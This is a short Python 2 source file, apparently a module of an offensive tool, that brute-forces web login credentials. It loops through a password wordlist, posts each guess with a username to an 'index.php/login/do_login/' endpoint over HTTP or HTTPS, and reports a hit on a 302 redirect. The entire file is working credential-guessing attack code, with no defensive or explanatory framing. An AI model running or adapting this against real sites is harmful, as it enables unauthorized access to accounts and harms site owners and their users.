#!/usr/bin/python

## modules/login.py
## File contains the single threaded brute-force login module

import string
import urllib
from modules import client

bold = '\033[1m'
normal = '\033[0m'


## Single-threaded module to brute-force login credentials
def brute(target, dir,ssl, user, wordlist):
    try:
        for password in open(wordlist):
            params = urllib.urlencode({'uName': user, 'uPassword': password.rstrip()})


            if ssl == True:
                data, status = client.https_post(target, dir + "index.php/login/do_login/", params)

            else:
                data, status = client.http_post(target, dir + "index.php/login/do_login/", params)

            if status == 302:
                print "\n", bold, "[+] Valid credentials found\r", normal
                print "", user + ":" + password
                print status
                break

    except Exception, error:
        print error

